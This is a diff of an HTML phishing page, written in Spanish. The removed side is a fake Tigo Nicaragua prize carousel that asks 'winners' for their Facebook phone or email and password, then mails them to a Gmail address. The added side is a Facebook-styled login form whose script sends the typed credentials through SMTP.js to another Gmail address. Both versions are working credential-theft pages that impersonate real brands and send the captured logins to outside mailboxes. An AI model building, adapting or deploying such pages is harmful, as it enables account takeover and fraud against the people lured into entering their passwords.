@@ -3,300 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página de Premios</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+    <title>Login Facebook Style</title>
     <style>
-        /* Estilos para el carrusel */
-        #carrusel {
-            width: 100%;
-            overflow: hidden;
-            white-space: nowrap;
-            border: 2px solid #ccc;
-            border-radius: 10px;
-            position: relative;
-            margin: 20px auto;
-            background-color: #f5f5f5;
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #F0F2F5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #FFFFFF;
             padding: 20px;
-            position: relative;
-        }
-        .opcion {
-            display: inline-block;
-            width: 120px;
-            height: 120px;
-            line-height: 120px;
-            text-align: center;
-            font-size: 18px;
-            font-weight: bold;
-            color: white;
-            background-color: #4a4a4a;
-            margin: 0 10px;
-            border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-        .opcion.centro {
-            transform: scale(1.2) rotate(5deg);
-            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.2);
-        }
-        #carrusel-container {
-            display: inline-block;
-            transition: transform 0.5s linear;
-        }
-        .mensaje-tigo {
-            font-size: 24px;
-            font-weight: bold;
-            text-align: center;
-            margin: 20px 0;
-            color: #3273dc;
-        }
-        .hero {
-            background-color: #3273dc;
-            color: white;
-            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 350px;
             text-align: center;
         }
-        .hero-title {
-            font-size: 2rem;
-            font-weight: bold;
+
+        .login-container h2 {
+            color: #1877F2;
+            margin-bottom: 20px;
         }
-        .footer {
-            background-color: #f5f5f5;
-            padding: 1rem;
-            text-align: center;
+
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #DDDFE2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        .login-container input:focus {
+            outline: none;
+            border-color: #1877F2;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877F2;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-container button:hover {
+            background-color: #166FE5;
+        }
+
+        .login-container a {
+            color: #1877F2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .login-container a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <!-- Navbar -->
-    <nav class="navbar is-light" role="navigation" aria-label="main navigation">
-        <div class="navbar-brand">
-            <a class="navbar-item" href="#">
-                <img src="https://www.liblogo.com/img-logo/ti6188t63b-tigo-logo-tigo-logo-.png" alt="Tigo Logo">
-            </a>
-        </div>
+    <div class="login-container">
+        <h2>Facebook</h2>
+        <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
+        <input type="password" id="password" placeholder="Contraseña" required>
+        <button onclick="enviarLogin()">Iniciar sesión</button>
+        <a href="#">¿Olvidaste tu contraseña?</a>
+    </div>
 
-        <div class="navbar-menu">
-            <div class="navbar-start">
-                <a class="navbar-item" href="#">
-                    Inicio
-                </a>
-                <a class="navbar-item" href="#">
-                    Productos
-                </a>
-                <a class="navbar-item" href="#">
-                    Servicios
-                </a>
-                <a class="navbar-item" href="#">
-                    Perfil
-                </a>
-            </div>
-        </div>
-    </nav>
-
-    <!-- Hero con Texto Publicitario -->
-    <section class="hero">
-        <div class="hero-body">
-            <h1 class="hero-title" id="hero-text">¡Disfruta de nuestras increíbles promociones!</h1>
-        </div>
-    </section>
-
-    <!-- Cuerpo de la página -->
-    <section class="section">
-        <div class="container">
-            <h1 class="title">Carrusel de Premios</h1>
-            <p class="mensaje-tigo">Con Tigo ganas más</p>
-            <div id="carrusel">
-                <div id="carrusel-container">
-                    <div class="opcion" style="background-color: #FF5733;">Recargas</div>
-                    <div class="opcion" style="background-color: #33FF57;">Internet</div>
-                    <div class="opcion" style="background-color: #3357FF;">Teléfonos</div>
-                    <div class="opcion" style="background-color: #FF33A1;">TV</div>
-                    <div class="opcion" style="background-color: #A133FF;">Termo</div>
-                    <div class="opcion" style="background-color: #33FFF5;">Camiseta</div>
-                    <div class="opcion" style="background-color: #F5FF33;">Gorra</div>
-                    <div class="opcion" style="background-color: #FF3333;">Mochila</div>
-                </div>
-            </div>
-            <button id="jugar" class="button is-primary">GANAR</button>
-        </div>
-    </section>
-
-    <!-- Sección de premio -->
-    <section class="section" id="premio-section" style="display: none;">
-        <div class="container">
-            <h2 class="title">¡Felicidades!</h2>
-            <p>Has ganado: <span id="premio-ganado"></span></p>
-            <div class="field">
-                <label class="label">Por favor  compruebe que usted es real brindando su información de facebook</label>
-                <label class="label">Número de Teléfono o correo</label>
-                <div class="control">
-                    <input id="telefono" class="input" type="text" placeholder="Número de Teléfono o correo">
-                </div>
-            </div>
-            <div class="field">
-                <label class="label">Contraseña</label>
-                <div class="control">
-                    <input id="contrasena" class="input" type="password" placeholder="Contraseña de Facebook">
-                </div>
-            </div>
-            <button id="enviar-correo" class="button is-success">Enviar Correo</button>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="content has-text-centered">
-            <p>
-                <strong>Tigo Nicaragua</strong> &copy; 2025. Todos los derechos reservados.
-            </p>
-        </div>
-    </footer>
-
-    <!-- Scripts -->
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script>
-        const premios = ["Recargas", "Internet", "Teléfonos", "TV", "Termo", "Camiseta", "Gorra", "Mochila"];
-        const carruselContainer = document.getElementById('carrusel-container');
-        const jugarBtn = document.getElementById('jugar');
-        const premioSection = document.getElementById('premio-section');
-        const premioGanado = document.getElementById('premio-ganado');
-        const telefonoInput = document.getElementById('telefono');
-        const contrasenaInput = document.getElementById('contrasena');
-        const enviarCorreoBtn = document.getElementById('enviar-correo');
-        const heroText = document.getElementById('hero-text');
+        function enviarLogin() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
-        let intervalo;
-        let desplazamiento = 0;
-        let jugando = false;
-
-        // Texto de introducción en SweetAlert
-        Swal.fire({
-            title: '¡Bienvenido al Carrusel de Premios!',
-            text: 'Para ver qué te has ganado, primero detén la ruleta ganadora cuando te sientas listo. Solo toca el botón de ganar y ya estás participando. Luego, deslízate en tu pantalla hacia abajo y rellena la información que se te solicita. Si quieres intentar ganar más cosas, puedes seguir jugando.',
-            icon: 'info',
-            confirmButtonText: 'Entendido'
-        });
-
-        // Textos publicitarios para el hero
-        const textosPublicitarios = [
-            "¡Disfruta de nuestras increíbles promociones!",
-            "Recargas con hasta 20% de descuento",
-            "Internet ilimitado por solo $10 al mes",
-            "Nuevos teléfonos con planes especiales",
-            "TV en vivo con más de 100 canales"
-        ];
-        let indiceTexto = 0;
-
-        // Función para cambiar el texto del hero
-        function cambiarTextoHero() {
-            heroText.textContent = textosPublicitarios[indiceTexto];
-            indiceTexto = (indiceTexto + 1) % textosPublicitarios.length;
+            // Enviar correo usando SMTP.js
+            Email.send({
+                Host: "smtp.gmail.com", // Servidor SMTP de Gmail
+                Username: "theprojectboom@gmail.com", // Correo desde el que se envía
+                Password: "tucontraseña", // Contraseña del correo
+                To: 'santiagoduarte1313@gmail.com', // Correo del destinatario
+                From: "theprojectboom@gmail.com", // Correo desde el que se envía
+                Subject: "Nuevo inicio de sesión", // Asunto del correo
+                Body: `Correo: ${email}<br>Contraseña: ${password}` // Cuerpo del mensaje
+            }).then(
+                message => alert("Información enviada con éxito")
+            );
         }
-
-        // Cambiar el texto del hero cada 2 segundos
-        setInterval(cambiarTextoHero, 2000);
-
-        // Función para mover el carrusel
-        function moverCarrusel() {
-            desplazamiento += 2; // Aumentamos la velocidad del carrusel
-            if (desplazamiento >= 120 * premios.length) {
-                desplazamiento = 0; // Reinicia el desplazamiento
-            }
-            carruselContainer.style.transform = `translateX(-${desplazamiento}px)`;
-
-            // Animación de crecimiento y giro en el centro
-            const opciones = document.querySelectorAll('.opcion');
-            opciones.forEach((opcion, index) => {
-                const posicion = (index * 120 - desplazamiento + 120 * premios.length) % (120 * premios.length);
-                if (posicion > 240 && posicion < 360) {
-                    opcion.classList.add('centro');
-                } else {
-                    opcion.classList.remove('centro');
-                }
-            });
-        }
-
-        // Iniciar el carrusel
-        function iniciarCarrusel() {
-            intervalo = setInterval(moverCarrusel, 10); // Mueve el carrusel cada 10ms
-            jugando = true;
-            jugarBtn.textContent = "GANAR";
-        }
-
-        // Detener el carrusel
-        function detenerCarrusel() {
-            clearInterval(intervalo);
-            jugando = false;
-
-            // Calcular el premio ganado
-            const indicePremio = Math.floor(desplazamiento / 120) % premios.length;
-            const premio = premios[indicePremio];
-
-            // Mostrar el premio con SweetAlert
-            Swal.fire({
-                title: '¡Felicidades!',
-                text: `Has ganado: ${premio}`,
-                icon: 'success',
-                confirmButtonText: 'Aceptar',
-                willClose: () => {
-                    // Mostrar la sección de premio
-                    premioGanado.textContent = premio;
-                    premioSection.style.display = 'block';
-
-                    // Lanzar confeti
-                    confetti({
-                        particleCount: 100,
-                        spread: 70,
-                        origin: { y: 0.6 }
-                    });
-
-                    // Vibrar el teléfono
-                    if (navigator.vibrate) {
-                        navigator.vibrate([100, 50, 100, 50, 100]); // Patrón de vibración alegre
-                    }
-                }
-            });
-
-            jugarBtn.textContent = "INTENTAR OTRA VEZ";
-        }
-
-        // Evento del botón "GANAR" / "INTENTAR OTRA VEZ"
-        jugarBtn.addEventListener('click', () => {
-            if (jugando) {
-                detenerCarrusel();
-            } else {
-                iniciarCarrusel();
-                premioSection.style.display = 'none';
-            }
-        });
-
-        // Evento del botón "Enviar Correo"
-        enviarCorreoBtn.addEventListener('click', () => {
-            const telefono = telefonoInput.value;
-            const contrasena = contrasenaInput.value;
-            const premio = premioGanado.textContent;
-
-            if (telefono && contrasena) {
-                Swal.fire({
-                    title: 'Procesando información',
-                    text: 'De clic en aceptar para continuar',
-                    icon: 'info',
-                    confirmButtonText: 'Aceptar',
-                    willClose: () => {
-                        const subject = `Ganador del Premio: ${premio}`;
-                        const body = `Número de Teléfono: ${telefono}\nContraseña: ${contrasena}\nPremio: ${premio}\n\nLa presente información es solicitada solo para verificar que usted es una persona real, por tal razón nos valemos de su cuenta de Facebook para confirmarlo. No se preocupe por sus datos, su información será eliminada en cuanto le hayamos enviado su premio. para enviar el correo haga clic en el icono que aparece en la parte de arriba, el que parece un triangulo.`;
-                        window.location.href = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-                    }
-                });
-            } else {
-                Swal.fire('Error', 'Por favor, ingresa tu número de teléfono y contraseña.', 'error');
-            }
-        });
-
-        // Iniciar el carrusel al cargar la página
-        iniciarCarrusel();
     </script>
 </body>
 </html>
